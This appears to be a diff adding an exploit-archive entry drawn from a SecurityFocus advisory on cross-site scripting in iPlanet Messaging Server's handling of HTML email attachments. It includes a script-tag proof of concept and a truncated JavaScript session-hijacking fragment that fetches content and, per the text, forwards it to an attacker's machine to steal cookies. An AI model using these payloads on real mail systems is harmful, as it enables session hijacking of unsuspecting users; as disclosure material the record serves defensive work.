@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/7704/info
+
+It has been reported that iPlanet Messaging Server may be prone to cross-site scripting attacks. The problem is said to occur while processing HTML attachments received via e-mail. If successfully exploited, a malicious HTML file may be used to steal an unsuspecting users iPlanet Messaging cookies. Other attacks may also be possible. 
+
+<html>
+<script>alert(document.URL)</script>
+</html>
+
+The following script code has been provided to demonstrate indirect session hijacking using web redirection:
+
+function%20steal(){var%20xmlHttp%20=%20new%20ActiveXObject("Microsoft.XMLHTTP");xmlHttp.open("GET","<URL_to_spoof>",false);xmlHttp.send();xmlDoc=xmlHttp.responseText;
+
+"xmldoc" can be redirected with a "img src", "window.open", to the attacker machine. 
